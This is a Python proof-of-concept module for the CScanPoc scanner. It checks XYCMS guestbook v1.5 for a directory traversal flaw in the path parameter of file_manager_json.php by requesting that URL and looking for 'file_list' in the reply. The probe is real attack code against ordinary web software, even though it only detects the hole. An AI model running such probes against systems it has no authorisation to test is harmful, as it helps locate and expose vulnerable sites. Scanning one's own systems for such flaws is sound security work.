# coding: utf-8

import requests as req
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'XYCMS_1000' # 平台漏洞编号
    name = 'XYCMS留言板v1.5任务目录遍历'
    level = VulnLevel.LOW
    type = VulnType.FILE_TRAVERSAL
    disclosure_date = '2018-3-14'
    desc = '''
        system/xyeditor/php/file_manager_json.php文件中path参数存在任意目录遍历
    '''
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'XYCMS'
    product_version = 'v1.5'

class Poc(ABPoc):
    poc_id = '85c998b4-8c4a-4a7c-a22d-daa8d226e220'
    author = 'cscan'
    create_date = '2018-3-14'

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
        try:
            path = '{target}/system/xyeditor/php/file_manager_json.php?path='.format(target=self.target)
            content = req.get(path)
            if 'file_list' in content.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
